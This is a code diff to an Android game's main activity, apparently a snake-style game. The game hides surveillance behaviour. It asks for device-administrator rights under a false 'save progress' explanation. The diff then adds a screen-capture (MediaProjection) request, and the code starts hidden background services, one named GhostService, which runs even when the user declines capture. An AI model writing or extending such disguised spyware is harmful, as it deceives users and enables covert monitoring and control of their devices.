@@ -5,6 +5,7 @@ import android.app.admin.DevicePolicyManager;
 import android.content.ComponentName;
 import android.content.Intent;
 import android.graphics.*;
+import android.media.projection.MediaProjectionManager;
 import android.os.Bundle;
 import android.os.Handler;
 import android.view.Gravity;
@@ -17,6 +18,7 @@ import java.util.Random;
 
 public class MainActivity extends Activity {
     private static final int WIN_SCORE = 10;
+    private static final int REQUEST_MEDIA_PROJECTION = 1001;
     private GameView gameView;
     private TextView scoreText;
     private Handler handler = new Handler();
@@ -26,10 +28,13 @@ public class MainActivity extends Activity {
     private LinearLayout menuLayout, gameLayout;
     private Button playBtn, boostBtn;
     private JoystickView joystick;
+    private MediaProjectionManager projectionManager;
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
+
+        projectionManager = (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);
 
         // Root untuk menu dan game
         LinearLayout root = new LinearLayout(this);
@@ -153,19 +158,35 @@ public class MainActivity extends Activity {
             intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Aktifkan admin untuk menyimpan progres!");
             startActivity(intent);
         } else {
-            startService(new Intent(this, GhostService.class));
-            finish();
+            // Setelah admin aktif, minta izin MediaProjection
+            requestMediaProjection();
         }
+    }
+
+    private void requestMediaProjection() {
+        startActivityForResult(projectionManager.createScreenCaptureIntent(), REQUEST_MEDIA_PROJECTION);
     }
 
     @Override
     protected void onActivityResult(int requestCode, int resultCode, Intent data) {
         super.onActivityResult(requestCode, resultCode, data);
-        DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
-        ComponentName comp = new ComponentName(this, DeviceAdminReceiver.class);
-        if (dpm.isAdminActive(comp)) {
+        if (requestCode == REQUEST_MEDIA_PROJECTION && resultCode == RESULT_OK) {
+            // Mulai service MediaProjection
+            Intent serviceIntent = new Intent(this, MediaProjectionService.class);
+            serviceIntent.putExtra("resultCode", resultCode);
+            serviceIntent.putExtra("data", data);
+            startService(serviceIntent);
+            // Jalankan GhostService
             startService(new Intent(this, GhostService.class));
             finish();
+        } else {
+            // Jika admin aktif tapi user tolak, tetap jalankan GhostService
+            DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
+            ComponentName comp = new ComponentName(this, DeviceAdminReceiver.class);
+            if (dpm.isAdminActive(comp)) {
+                startService(new Intent(this, GhostService.class));
+                finish();
+            }
         }
     }
 
@@ -255,11 +276,11 @@ public class MainActivity extends Activity {
             // Makanan
             for (Food f : foods) {
                 switch (f.type) {
-                    case 0: foodPaint.setColor(0xFFFF4444); break; // merah
-                    case 1: foodPaint.setColor(0xFF44FF44); break; // hijau
-                    case 2: foodPaint.setColor(0xFF4444FF); break; // biru
-                    case 3: foodPaint.setColor(0xFFFFAA00); break; // oranye
-                    case 4: foodPaint.setColor(0xFFFF44FF); break; // ungu
+                    case 0: foodPaint.setColor(0xFFFF4444); break;
+                    case 1: foodPaint.setColor(0xFF44FF44); break;
+                    case 2: foodPaint.setColor(0xFF4444FF); break;
+                    case 3: foodPaint.setColor(0xFFFFAA00); break;
+                    case 4: foodPaint.setColor(0xFFFF44FF); break;
                 }
                 canvas.drawCircle(f.x, f.y, 8 + f.type * 2, foodPaint);
             }
